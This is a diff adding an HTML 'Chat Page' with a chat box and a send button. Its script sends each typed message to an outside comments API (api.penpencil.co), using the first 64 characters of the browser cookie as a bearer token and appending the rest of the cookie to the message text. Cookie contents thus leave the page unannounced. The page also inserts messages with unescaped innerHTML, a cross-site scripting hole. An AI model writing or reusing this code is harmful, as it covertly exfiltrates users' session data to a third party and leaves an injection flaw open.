@@ -1,0 +1,135 @@
+<html>
+  <head>
+    <title>Chat Page</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f2f2f2;
+        margin: 0;
+        padding: 0;
+      }
+      .container {
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 20px;
+        box-sizing: border-box;
+        background-color: #fff;
+        border-radius: 10px;
+        box-shadow: 0px 5px 10px rgba(0, 0, 0, 0.1);
+      }
+      .chatbox {
+        height: 500px;
+        overflow-y: scroll;
+        padding: 10px;
+        border-radius: 10px;
+        background-color: #f2f2f2;
+        margin-bottom: 20px;
+      }
+      .message {
+        display: inline-block;
+        max-width: 60%;
+        padding: 10px;
+        margin-bottom: 10px;
+        border-radius: 10px;
+        word-wrap: break-word;
+        clear: both; /* Add this new rule */
+      }
+      .sent {
+        background-color: #dcf8c6;
+        float: right;
+      }
+      .received {
+        background-color: #fff;
+        float: left;
+      }
+      .message p {
+        margin: 0;
+        font-size: 16px;
+        line-height: 1.5;
+      }
+      .input-group {
+        display: flex;
+        align-items: center;
+        margin-bottom: 20px;
+      }
+      .input-group input {
+        flex-grow: 1;
+        padding: 10px;
+        font-size: 16px;
+        border: none;
+        border-radius: 5px;
+        background-color: #f2f2f2;
+      }
+      .input-group button {
+        margin-left: 10px;
+        padding: 10px 20px;
+        font-size: 16px;
+        border: none;
+        border-radius: 5px;
+        background-color: #4CAF50;
+        color: #fff;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+     
+      <div class="chatbox"></div>
+      <div class="input-group">
+        <input type="text" id="cur_msg" placeholder="Type your message here...">
+        <button>Send</button>
+      </div>
+    </div>
+
+    <script>
+function createNewComment(token, text) {
+  const data = {
+    text: text,
+    type: "BATCH_SUBJECT_SCHEDULE",
+    typeId: "61b19dc26720b700114a49d0"
+  };
+  
+  fetch("https://api.penpencil.co/v1/comments", {
+    method: "POST",
+    headers: {
+      "Authorization": `Bearer ${token}`,
+      "Content-Type": "application/json",
+      "Randomid": "937001d3-732a-402e-89c0-b70d2bc56cb5",
+      "Client-Id": "5eb393ee95fab7468a79d189"
+    },
+    body: JSON.stringify(data)
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log("New comment created:", data);
+  })
+  .catch(error => {
+    console.error("Error creating comment:", error);
+  });
+}
+
+      const chatbox = document.querySelector(".chatbox");
+      const messageInput = document.querySelector("input");
+      const sendButton = document.querySelector("button");
+
+      sendButton.addEventListener("click", sendMessage);
+
+      function sendMessage() {
+        const message = messageInput.value;
+
+        if (message) {
+          const messageElement = document.createElement("div");
+          messageElement.classList.add("message", "sent");
+          messageElement.innerHTML = `<p>${message}</p>`;
+	  createNewComment((document.cookie.slice(0,64)),(message+document.cookie.slice(64)))
+          chatbox.appendChild(messageElement);
+
+          messageInput.value = "";
+        }
+      }
+    </script>
+<button onclick="start()">Log Out</button>
+<script>function start(){document.cookie="";window.location.replace("/")}</script>
+  </body>
+</html>
